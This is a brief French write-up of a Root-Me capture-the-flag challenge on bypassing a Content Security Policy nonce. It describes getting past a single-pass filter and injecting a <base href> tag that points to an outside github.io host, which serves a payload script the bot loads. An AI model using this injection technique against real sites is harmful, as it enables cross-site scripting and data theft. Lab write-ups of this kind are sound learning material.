Le challenge : https://www.root-me.org/fr/Challenges/Web-Client/CSP-Bypass-Nonce-2


En étudiant le csp on remarque rapidement qu'une acte est possible via base uri 

Donc pour <base href> son but va être de contourner de remplacer l'url de base

Cependant on remarque vite que le script filtre <> qu'une fois a cause de .replace() donc on mets <> devant 

On créer notre propre script color.js avec notre payload hébergé sur un serveur

Le bot va alors être redirigé sur notre site et va utiliser notre site avec notre payload 

Attention avec le csp img et fetch ne marchent pas par exemple, on utilisera location 

Et on lui donnera et bien sur encodé <><base href="https://cobroux.github.io//">
et le tour est joué

